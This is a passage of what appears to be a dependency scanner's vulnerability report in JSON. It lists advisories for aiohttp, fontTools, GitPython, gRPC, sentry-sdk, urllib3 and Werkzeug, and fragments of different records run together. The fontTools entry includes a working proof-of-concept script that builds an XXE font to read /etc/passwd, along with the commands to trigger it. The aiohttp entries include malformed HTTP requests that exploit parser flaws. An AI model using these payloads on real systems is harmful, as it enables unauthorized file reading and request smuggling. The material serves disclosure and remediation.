traversal","detail":"# aiohttp is vulnerable to directory traversal ### Summary Improperly configuring static resource resolution in aiohttp when used as a web server can result in the unauthorized reading of arbitrary files on the system.  ### Details When using aiohttp as a web server and configuring static routes, it is necessary to specify the root path for static files. Additionally, the option 'follow_symlinks' can be used to determine whether to follow symbolic links outside the static root directory. When 'follow_symlinks' is set to True, there is no validation to check if a given file path is within the root directory.This can lead to directory traversal vulnerabilities, resulting in unauthorized access to arbitrary files on the system, even when symlinks are not present.  i.e. An application is only vulnerable with setup code like: ``` app.router.add_routes([   web.static(\"/static\", \"static/\", follow_symlinks=True), # Remove follow_symlinks to avoid the vulnerability ]) ```  ### Impact This is a directory traversal vulnerability with CWE ID 22. When using aiohttp as a web server and enabling static resource resolution with `follow_symlinks` set to True, it can lead to this vulnerability. This vulnerability has been present since the introduction of the `follow_symlinks` parameter.  ### Workaround Even if upgrading to a patched version of aiohttp, we recommend following these steps regardless.  If using `follow_symlinks=True` outside of a restricted local development environment, disable the option immediately. This option is NOT needed to follow symlinks which point to a location _within_ the static root directory, it is _only_ intended to allow a symlink to break out of the static directory. Even with this CVE fixed, there is still a substantial risk of misconfiguration when using this option on a server that accepts requests from remote users.  Additionally, aiohttp has always recommended using a reverse proxy server (such as nginx) to handle static resources and _not_ to use these static resources in aiohttp for production environments. Doing so also protects against this vulnerability, and is why we expect the number of affected users to be very low.  -----  Patch: https://github.com/aio-libs/aiohttp/pull/8079/files  ## Related CVE(s) CVE-2024-23334, PYSEC-2024-24","id":"CVE-2024-23334","properties":[{"name":"depscan:prioritized","value":"false"}],"published":"2024-01-29T22:31:03","ratings":[{"method":"CVSSv31","score":5.9,"severity":"medium","vector":"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"}],"recommendation":"Update to version 3.9.2.","references":[{"id":"fedoraproject-msg-ICUOCFGTB25WUT336BZ4UNYLSZOUVKBD","source":{"name":"Fedora Project Mailing List","url":"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ICUOCFGTB25WUT336BZ4UNYLSZOUVKBD"}},{"id":"GHSA-5h86-8mv2-jq9f","source":{"name":"GitHub Advisory","url":"https://github.com/aio-libs/aiohttp/security/advisories/GHSA-5h86-8mv2-jq9f"}},{"id":"PYSEC-2024-24","source":{"name":"GitHub Advisory","url":"https://github.com/pypa/advisory-database/tree/main/vulns/aiohttp/PYSEC-2024-24.yaml"}},{"id":"fedoraproject-msg-XXWVZIVAYWEBHNRIILZVB3R3SDQNNAA7","source":{"name":"Fedora Project Mailing List","url":"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/XXWVZIVAYWEBHNRIILZVB3R3SDQNNAA7"}},{"id":"CVE-2024-23334","source":{"name":"NVD","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-23334"}}],"source":{"name":"NVD","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-23334"},"updated":"2024-09-04T20:04:07"},{"advisories":[{"title":"GitHub Advisory GHSA-5m98-qgg9-wh84","url":"https://github.com/aio-libs/aiohttp/security/advisories/GHSA-5m98-qgg9-wh84"},{"title":"CVE-2024-30251","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-30251"}],"affects":[{"ref":"pkg:pypi/aiohttp@3.8.5","versions":[{"range":"vers:pypi/>=0.1|<=3.9.4rc0","status":"affected"}]}],"analysis":{"detail":"Dependency Tree: [\"pkg:pypi/aiogram@2.25.1\", \"pkg:pypi/aiohttp@3.8.5\"]","state":"in_triage"},"bom-ref":"CVE-2024-30251/pkg:pypi/aiohttp@3.8.5","cwes":[835],"description":"aiohttp vulnerable to Denial of Service when trying to parse malformed POST requests","detail":"# aiohttp vulnerable to Denial of Service when trying to parse malformed POST requests ### Summary An attacker can send a specially crafted POST (multipart/form-data) request.

This parser is only used when `AIOHTTP_NO_EXTENSIONS` is enabled (or not using a prebuilt wheel).   # Details  ## Bug 1: Bad parsing of `Content-Length` values  ### Description RFC 9110 says this: > `Content-Length = 1*DIGIT`  AIOHTTP does not enforce this rule, presumably because of an incorrect usage of the builtin `int` constructor. Because the `int` constructor accepts `+` and `-` prefixes, and digit-separating underscores, using `int` to parse CL values leads AIOHTTP to significant misinterpretation.  ### Examples ``` GET / HTTP/1.1   Content-Length: -0      X ``` ``` GET / HTTP/1.1   Content-Length: +0_1      X ```  ### Suggested action Verify that a `Content-Length` value consists only of ASCII digits before parsing, as the standard requires.  ## Bug 2: Improper handling of NUL, CR, and LF in header values  ### Description RFC 9110 says this: > Field values containing CR, LF, or NUL characters are invalid and dangerous, due to the varying ways that implementations might parse and interpret those characters; a recipient of CR, LF, or NUL within a field value MUST either reject the message or replace each of those characters with SP before further processing or forwarding of that message.  AIOHTTP's HTTP parser does not enforce this rule, and will happily process header values containing these three forbidden characters without replacing them with SP. ### Examples ``` GET / HTTP/1.1   Header: v\\x00alue      ``` ``` GET / HTTP/1.1   Header: v alue      ``` ``` GET / HTTP/1.1   Header: v alue      ``` ### Suggested action Reject all messages with NUL, CR, or LF in a header value. The translation to space thing, while technically allowed, does not seem like a good idea to me.  ## Bug 3: Improper stripping of whitespace before colon in HTTP headers  ### Description RFC 9112 says this: > No whitespace is allowed between the field name and colon. In the past, differences in the handling of such whitespace have led to security vulnerabilities in request routing and response handling. A server MUST reject, with a response status code of 400 (Bad Request), any received request message that contains whitespace between a header field name and colon.  AIOHTTP does not enforce this rule, and will simply strip any whitespace before the colon in an HTTP header.  ### Example ``` GET / HTTP/1.1   Content-Length : 1      X ```  ### Suggested action Reject all messages with whitespace before a colon in a header field, as the standard requires.  # PoC Example requests are embedded in the previous section. To reproduce these bugs, start an AIOHTTP server without llhttp (i.e. `AIOHTTP_NO_EXTENSIONS=1`) and send the requests given in the previous section.

This allows attackers to include arbitrary files from the filesystem fontTools is running on or make web requests from the host system.   ### PoC   The vulnerability can be reproduced following the bellow steps on a unix based system.  1. Build a OT-SVG font which includes a external entity in the SVG table which resolves a local file. In our testing we utilised `/etc/passwd` for our POC file to include and modified an existing subset integration test to build the POC font - see bellow.  ```python  from string import ascii_letters from fontTools.fontBuilder import FontBuilder from fontTools.pens.ttGlyphPen import TTGlyphPen from fontTools.ttLib import newTable   XXE_SVG = \"\"\"\\ <?xml version=\"1.0\"?> <!DOCTYPE svg [<!ENTITY test SYSTEM 'file:///etc/passwd'>]> <svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">  <g id=\"glyph1\">   <text font-size=\"10\" x=\"0\" y=\"10\">&test;</text>  </g> </svg> \"\"\"  def main():   # generate a random TTF font with an SVG table   glyph_order = [\".notdef\"] + list(ascii_letters)   pen = TTGlyphPen(glyphSet=None)   pen.moveTo((0, 0))   pen.lineTo((0, 500))   pen.lineTo((500, 500))   pen.lineTo((500, 0))   pen.closePath()   glyph = pen.glyph()   glyphs = {g: glyph for g in glyph_order}    fb = FontBuilder(unitsPerEm=1024, isTTF=True)   fb.setupGlyphOrder(glyph_order)   fb.setupCharacterMap({ord(c): c for c in ascii_letters})   fb.setupGlyf(glyphs)   fb.setupHorizontalMetrics({g: (500, 0) for g in glyph_order})   fb.setupHorizontalHeader()   fb.setupOS2()   fb.setupPost()   fb.setupNameTable({\"familyName\": \"TestSVG\", \"styleName\": \"Regular\"})    svg_table = newTable(\"SVG \")   svg_table.docList = [     (XXE_SVG, 1, 12)   ]   fb.font[\"SVG \"] = svg_table    fb.font.save('poc-payload.ttf')  if __name__ == '__main__':   main()  ```  2. Subset the font with an affected version of fontTools - we tested on `fonttools==4.42.1` and `fonttools==4.28.2` - using the following flags (which just ensure the malicious glyph is mapped by the font and not discard in the subsetting process):  ```shell pyftsubset poc-payload.ttf --output-file=\"poc-payload.subset.ttf\" --unicodes=\"*\" --ignore-missing-glyphs ```  3. Read the parsed SVG table in the subsetted font:  ```shell ttx -t SVG poc-payload.subset.ttf && cat poc-payload.subset.ttx ```  Observed the included contents of the `/etc/passwd` file.   ### Impact  Note the final severity is dependant on the environment fontTools is running in.  - The vulnerability has the most impact on consumers of fontTools who leverage the subsetting utility to subset untrusted OT-SVG fonts where the vulnerability may be exploited to read arbitrary files from the filesystem of the host fonttools is running on    ### Possible Mitigations   There may be other ways to mitigate the issue, but some suggestions:  1. Set the `resolve_entities=False` flag on parsing methods 2. Consider further methods of disallowing doctype declarations 3. Consider recursive regex matching","id":"CVE-2023-45139","properties":[{"name":"depscan:prioritized","value":"false"}],"published":"2024-01-09T16:01:10","ratings":[{"method":"CVSSv31","score":7.5,"severity":"high","vector":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}],"recommendation":"Update to version 4.43.0.","references":[{"id":"CVE-2023-45139","source":{"name":"NVD","url":"https://nvd.nist.gov/vuln/detail/CVE-2023-45139"}},{"id":"fedoraproject-msg-VY63B4SGY4QOQGUXMECRGD6K3YT3GJ75","source":{"name":"Fedora Project Mailing List","url":"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/VY63B4SGY4QOQGUXMECRGD6K3YT3GJ75"}},{"id":"openwall-oss-security-msg-2024-03-09-1","source":{"name":"Openwall Mailing List","url":"http://www.openwall.com/lists/oss-security/2024/03/09/1"}},{"id":"openwall-oss-security-msg-2024-03-08-2","source":{"name":"Openwall Mailing List","url":"http://www.openwall.com/lists/oss-security/2024/03/08/2"}},{"id":"GHSA-6673-4983-2vx5","source":{"name":"GitHub Advisory","url":"https://github.com/fonttools/fonttools/security/advisories/GHSA-6673-4983-2vx5"}}],"source":{"name":"NVD","url":"https://nvd.nist.gov/vuln/detail/CVE-2023-45139"},"updated":"2024-05-02T13:16:16"},{"advisories":[{"title":"GitHub Advisory PYSEC-2024-4","url":"https://github.com/pypa/advisory-database/tree/main/vulns/gitpython/PYSEC-2024-4.yaml"},{"title":"CVE-2024-22190","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-22190"},{"title":"GitHub Advisory GHSA-2mqj-m65w-jghx","url":"https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-2mqj-m65w-jghx"}],"affects":[{"ref":"pkg:pypi/gitpython@3.1.35","versions":[{"range":"vers:pypi/>=0.0.0|<3.1.41","status":"affected"},{"status":"unaffected","version":"3.1.41"}]}],"analysis":{"detail":"Dependency Tree: [\"pkg:pypi/bandit@1.7.5\", \"pkg:pypi/gitpython@3.1.35\"]","state":"in_triage"},"bom-ref":"CVE-2024-22190/pkg:pypi/gitpython@3.1.35","cwes":[426],"description":"","detail":"Refer to the supporting media","id":"CVE-2024-22190","properties":[{"name":"depscan:prioritized","value":"false"}],"published":"2024-01-10T15:46:00","ratings":[{"method":"CVSSv31","score":7.8,"severity":"high","vector":"CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"}],"recommendation":"Update to version 3.1.41.","references":[{"id":"PYSEC-2024-4","source":{"name":"GitHub Advisory","url":"https://github.com/pypa/advisory-database/tree/main/vulns/gitpython/PYSEC-2024-4.yaml"}},{"id":"CVE-2024-22190","source":{"name":"NVD","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-22190"}},{"id":"GHSA-2mqj-m65w-jghx","source":{"name":"GitHub Advisory","url":"https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-2mqj-m65w-jghx"}}],"source":{"name":"NVD","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-22190"},"updated":"2024-02-16T08:14:20"},{"advisories":[{"title":"GitHub Advisory GHSA-cwvm-v4w8-q58c","url":"https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-cwvm-v4w8-q58c"},{"title":"GitHub Advisory PYSEC-2023-165","url":"https://github.com/pypa/advisory-database/tree/main/vulns/gitpython/PYSEC-2023-165.yaml"},{"title":"Debian Mailing List msg00036","url":"https://lists.debian.org/debian-lts-announce/2023/09/msg00036.html"},{"title":"CVE-2023-41040","url":"https://nvd.nist.gov/vuln/detail/CVE-2023-41040"}],"affects":[{"ref":"pkg:pypi/gitpython@3.1.35","versions":[{"range":"vers:pypi/>=0.0.0|<3.1.37","status":"affected"},{"status":"unaffected","version":"3.1.37"}]}],"analysis":{"detail":"Dependency Tree: [\"pkg:pypi/bandit@1.7.5\", \"pkg:pypi/gitpython@3.1.35\"]","state":"in_triage"},"bom-ref":"CVE-2023-41040/pkg:pypi/gitpython@3.1.35","cwes":[22],"description":"Blind local file inclusion","detail":"# Blind local file inclusion ### Summary  In order to resolve some git references, GitPython reads files from the `.git` directory, in some places the name of the file being read is provided by the user, GitPython doesn't check if this file is located outside the `.git` directory.

Maybe there could be other checks in place to make sure that the reference names are valid.  ---  > [!NOTE] > This vulnerability was reported via email, and it was decided to publish it here and make it public, so the community is aware of it, and a fix can be provided.  ## Related CVE(s) CVE-2023-41040, PYSEC-2023-165","id":"CVE-2023-41040","properties":[{"name":"depscan:prioritized","value":"false"}],"published":"2023-08-30T20:09:36","ratings":[{"method":"CVSSv31","score":4.0,"severity":"medium","vector":"CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"}],"recommendation":"Update to version 3.1.37 to resolve CVE-2023-41040 or update to version 3.1.41 to resolve additional vulnerabilities for this package.","references":[{"id":"GHSA-cwvm-v4w8-q58c","source":{"name":"GitHub Advisory","url":"https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-cwvm-v4w8-q58c"}},{"id":"PYSEC-2023-165","source":{"name":"GitHub Advisory","url":"https://github.com/pypa/advisory-database/tree/main/vulns/gitpython/PYSEC-2023-165.yaml"}},{"id":"debian-msg-msg00036","source":{"name":"Debian Mailing List","url":"https://lists.debian.org/debian-lts-announce/2023/09/msg00036.html"}},{"id":"CVE-2023-41040","source":{"name":"NVD","url":"https://nvd.nist.gov/vuln/detail/CVE-2023-41040"}}],"source":{"name":"NVD","url":"https://nvd.nist.gov/vuln/detail/CVE-2023-41040"},"updated":"2024-02-16T08:22:24"},{"advisories":[{"title":"GitHub Advisory GHSA-496j-2rq6-j6cc","url":"https://github.com/advisories/GHSA-496j-2rq6-j6cc"},{"title":"Google Advisory bulletins","url":"https://cloud.google.com/support/bulletins#gcp-2023-022"},{"title":"Snyk Advisory SNYK-RUBY-GRPC-5834442","url":"https://security.snyk.io/vuln/SNYK-RUBY-GRPC-5834442"},{"title":"CVE-2023-33953","url":"https://nvd.nist.gov/vuln/detail/CVE-2023-33953"},{"title":"GitHub Advisory CVE-2023-33953","url":"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/grpc/CVE-2023-33953.yml"}],"affects":[{"ref":"pkg:pypi/grpcio@1.56.0","versions":[{"range":"vers:pypi/>=1.56.0|<1.56.2","status":"affected"},{"status":"unaffected","version":"1.56.2"}]}],"analysis":{"detail":"Dependency Tree: [\"pkg:pypi/opentelemetry-exporter-jaeger-proto-grpc@1.15.0\", \"pkg:pypi/grpcio@1.56.0\"]","state":"in_triage"},"bom-ref":"CVE-2023-33953/pkg:pypi/grpcio@1.56.0","cwes":[770,789],"description":"Excessive Iteration in gRPC","detail":"# Excessive Iteration in gRPC gRPC contains a vulnerability that allows hpack table accounting errors could lead to unwanted disconnects between clients and servers in exceptional cases/\u00a0Three vectors were found that allow the following DOS attacks:  - Unbounded memory buffering in the HPACK parser - Unbounded CPU consumption in the HPACK parser  The unbounded CPU consumption is down to a copy that occurred per-input-block in the parser, and because that could be unbounded due to the memory copy bug we end up with an O(n^2) parsing loop, with n selected by the client.

However, if you specifically do not want them to be passed to subprocesses, you may use `env` argument in `subprocess` calls, like in this example:  ``` >>> subprocess.check_output([\"env\"], env={\"TEST\":\"1\"}) b'TEST=1 ' ```  If you'd want to not pass any variables, you can set an empty dict:  ``` >>> subprocess.check_output([\"env\"], env={}) b'' ```  However, the bug in Sentry SDK <2.8.0 causes **all environment variables** to be passed to the subprocesses when `env={}` is set, unless the Sentry SDK's [Stdlib](https://docs.sentry.io/platforms/python/integrations/default-integrations/#stdlib) integration is disabled. The Stdlib integration is enabled by default.  ### Patches The issue has been patched in https://github.com/getsentry/sentry-python/pull/3251 and the fix released in [sentry-sdk==2.8.0](https://github.com/getsentry/sentry-python/releases/tag/2.8.0). The fix was also backported to [sentry-sdk==1.45.1](https://github.com/getsentry/sentry-python/releases/tag/1.45.1).  ### Workarounds  We strongly recommend upgrading to the latest SDK version. However, if it's not possible, and if passing environment variables to child processes poses a security risk for you, there are two options:  1. In your application, replace `env={}` with the minimal dict `env={\"EMPTY_ENV\":\"1\"}` or similar.  OR  2.

cross-origin redirects ","detail":"# urllib3's Proxy-Authorization request header isn't stripped during cross-origin redirects  When using urllib3's proxy support with `ProxyManager`, the `Proxy-Authorization` header is only sent to the configured proxy, as expected.  However, when sending HTTP requests *without* using urllib3's proxy support, it's possible to accidentally configure the `Proxy-Authorization` header even though it won't have any effect as the request is not using a forwarding proxy or a tunneling proxy. In those cases, urllib3 doesn't treat the `Proxy-Authorization` HTTP header as one carrying authentication material and thus doesn't strip the header on cross-origin redirects.  Because this is a highly unlikely scenario, we believe the severity of this vulnerability is low for almost all users. Out of an abundance of caution urllib3 will automatically strip the `Proxy-Authorization` header during cross-origin redirects to avoid the small chance that users are doing this on accident.  Users should use urllib3's proxy support or disable automatic redirects to achieve safe processing of the `Proxy-Authorization` header, but we still decided to strip the header by default in order to further protect users who aren't using the correct approach.  ## Affected usages  We believe the number of usages affected by this advisory is low. It requires all of the following to be true to be exploited:  * Setting the `Proxy-Authorization` header without using urllib3's built-in proxy support. * Not disabling HTTP redirects. * Either not using an HTTPS origin server or for the proxy or target origin to redirect to a malicious origin.  ## Remediation  * Using the `Proxy-Authorization` header with urllib3's `ProxyManager`. * Disabling HTTP redirects using `redirects=False` when sending requests. * Not using the `Proxy-Authorization` header.","id":"CVE-2024-37891","properties":[{"name":"depscan:prioritized","value":"false"}],"published":"2024-06-17T21:37:20","ratings":[{"method":"CVSSv31","score":4.4,"severity":"medium","vector":"CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:N/A:N"}],"recommendation":"","references":[{"id":"CVE-2024-37891","source":{"name":"NVD","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-37891"}},{"id":"GHSA-34jh-p97f-mpxf","source":{"name":"GitHub Advisory","url":"https://github.com/urllib3/urllib3/security/advisories/GHSA-34jh-p97f-mpxf"}}],"source":{"name":"NVD","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-37891"},"updated":"2024-07-15T22:12:28"},{"advisories":[{"title":"GitHub Advisory PYSEC-2023-212","url":"https://github.com/pypa/advisory-database/tree/main/vulns/urllib3/PYSEC-2023-212.yaml"},{"title":"Fedora Project Mailing List 5F5CUBAN5XMEBVBZPHFITBLMJV5FIJJ5","url":"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/5F5CUBAN5XMEBVBZPHFITBLMJV5FIJJ5"},{"title":"Rfc-editor Advisory rfc9110","url":"https://www.rfc-editor.org/rfc/rfc9110.html#name-get"},{"title":"Fedora Project Mailing List 4R2Y5XK3WALSR3FNAGN7JBYV2B343ZKB","url":"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/4R2Y5XK3WALSR3FNAGN7JBYV2B343ZKB"},{"title":"Fedora Project Mailing List PPDPLM6UUMN55ESPQWJFLLIZY4ZKCNRX","url":"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/PPDPLM6UUMN55ESPQWJFLLIZY4ZKCNRX"},{"title":"GitHub Advisory GHSA-g4mx-q9vg-27p4","url":"https://github.com/urllib3/urllib3/security/advisories/GHSA-g4mx-q9vg-27p4"},{"title":"CVE-2023-45803","url":"https://nvd.nist.gov/vuln/detail/CVE-2023-45803"}],"affects":[{"ref":"pkg:pypi/urllib3@1.26.17","versions":[{"range":"vers:pypi/>=0.2|<=1.26.17","status":"affected"}]}],"analysis":{"detail":"Dependency Tree: [\"pkg:pypi/boto3@1.27.1\", \"pkg:pypi/botocore@1.30.1\", \"pkg:pypi/urllib3@1.26.17\"]","state":"in_triage"},"bom-ref":"CVE-2023-45803/pkg:pypi/urllib3@1.26.17","cwes":[200],"description":"urllib3's request body not stripped after redirect from 303 status changes request method to GET","detail":"# urllib3's request body not stripped after redirect from 303 status changes request method to GET urllib3 previously wouldn't remove the HTTP request body when an HTTP redirect response using status 303 \"See Other\" after the request had its method changed from one that could accept a request body (like `POST`) to `GET` as is required by HTTP RFCs. Although the behavior of removing the request body is not specified in the section for redirects, it can be inferred by piecing together information from different sections and we have observed the behavior in other major HTTP client implementations like curl and web browsers.  From [RFC 9110 Section 9.3.1](https://www.rfc-editor.org/rfc/rfc9110.html#name-get):  > A client SHOULD NOT generate content in a GET request unless it is made directly to an origin server that has previously indicated, in or out of band, that such a request has a purpose and will be adequately supported.  ## Affected usages  Because the vulnerability requires a previously trusted service to become compromised in order to have an impact on confidentiality we believe the exploitability of this vulnerability is low. Additionally, many users aren't putting sensitive data in HTTP request bodies, if this is the case then this vulnerability isn't exploitable.  Both of the following conditions must be true to be affected by this vulnerability:  * If you're using urllib3 and submitting sensitive information in the HTTP request body (such as form data or JSON) * The origin service is compromised and starts redirecting using 303 to a malicious peer or the redirected-to service becomes compromised.  ## Remediation  You can remediate this vulnerability with any of the following steps:  * Upgrade to a patched version of urllib3 (v1.26.18 or v2.0.7) * Disable redirects for services that you aren't expecting to respond with redirects with `redirects=False`. * Disable automatic redirects with `redirects=False` and handle 303 redirects manually by stripping the HTTP request body.   ## Related CVE(s) CVE-2023-45803, PYSEC-2023-212","id":"CVE-2023-45803","properties":[{"name":"depscan:prioritized","value":"false"}],"published":"2023-10-17T20:15:25","ratings":[{"method":"CVSSv31","score":4.2,"severity":"medium","vector":"CVSS:3.1/AV:A/AC:H/PR:H/UI:N/S:U/C:H/I:N/A:N"}],"recommendation":"","references":[{"id":"PYSEC-2023-212","source":{"name":"GitHub Advisory","url":"https://github.com/pypa/advisory-database/tree/main/vulns/urllib3/PYSEC-2023-212.yaml"}},{"id":"fedoraproject-msg-5F5CUBAN5XMEBVBZPHFITBLMJV5FIJJ5","source":{"name":"Fedora Project Mailing List","url":"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/5F5CUBAN5XMEBVBZPHFITBLMJV5FIJJ5"}},{"id":"rfc9110","source":{"name":"Rfc-editor Advisory","url":"https://www.rfc-editor.org/rfc/rfc9110.html#name-get"}},{"id":"fedoraproject-msg-4R2Y5XK3WALSR3FNAGN7JBYV2B343ZKB","source":{"name":"Fedora Project Mailing List","url":"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/4R2Y5XK3WALSR3FNAGN7JBYV2B343ZKB"}},{"id":"fedoraproject-msg-PPDPLM6UUMN55ESPQWJFLLIZY4ZKCNRX","source":{"name":"Fedora Project Mailing List","url":"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/PPDPLM6UUMN55ESPQWJFLLIZY4ZKCNRX"}},{"id":"GHSA-g4mx-q9vg-27p4","source":{"name":"GitHub Advisory","url":"https://github.com/urllib3/urllib3/security/advisories/GHSA-g4mx-q9vg-27p4"}},{"id":"CVE-2023-45803","source":{"name":"NVD","url":"https://nvd.nist.gov/vuln/detail/CVE-2023-45803"}}],"source":{"name":"NVD","url":"https://nvd.nist.gov/vuln/detail/CVE-2023-45803"},"updated":"2024-02-21T05:25:29"},{"advisories":[{"title":"Fedora Project Mailing List H4SH32AM3CTPMAAEOIDAN7VU565LO4IR","url":"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/H4SH32AM3CTPMAAEOIDAN7VU565LO4IR"},{"title":"Fedora Project Mailing List HFERFN7PINV4MOGMGA3DPIXJPDCYOEJZ","url":"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/HFERFN7PINV4MOGMGA3DPIXJPDCYOEJZ"},{"title":"CVE-2024-34069","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-34069"},{"title":"NetApp Advisory ntap-20240614-0004","url":"https://security.netapp.com/advisory/ntap-20240614-0004"},{"title":"GitHub Advisory GHSA-2g68-c3qc-8985","url":"https://github.com/pallets/werkzeug/security/advisories/GHSA-2g68-c3qc-8985"}],"affects":[{"ref":"pkg:pypi/werkzeug@2.3.6","versions":[{"range":"vers:pypi/>=0.1|<=3.0.2","status":"affected"}]}],"analysis":{"detail":"Dependency Tree: [\"pkg:pypi/moto@4.1.12\", \"pkg:pypi/werkzeug@2.3.6\"]","state":"in_triage"},"bom-ref":"CVE-2024-34069/pkg:pypi/werkzeug@2.3.6","cwes":[352],"description":"Werkzeug debugger vulnerable to remote execution when interacting with attacker controlled domain","detail":"# Werkzeug debugger vulnerable to remote execution when interacting with attacker controlled domain The debugger in affected versions of Werkzeug can allow an attacker to execute code on a developer's machine under some circumstances.

That's why parsing is based on looking for newline characters. Unfortunately, code looking for partial boundary in the buffer is written inefficiently, so if we upload a file that starts with CR or LF and then is followed by megabytes of data without these characters: all of these bytes are appended chunk by chunk into internal bytearray and lookup for boundary is performed on growing buffer.  This allows an attacker to cause a denial of service by sending crafted multipart data to an endpoint that will parse it. The amount of CPU time required can block worker processes from handling legitimate requests. The amount of RAM required can trigger an out of memory kill of the process.
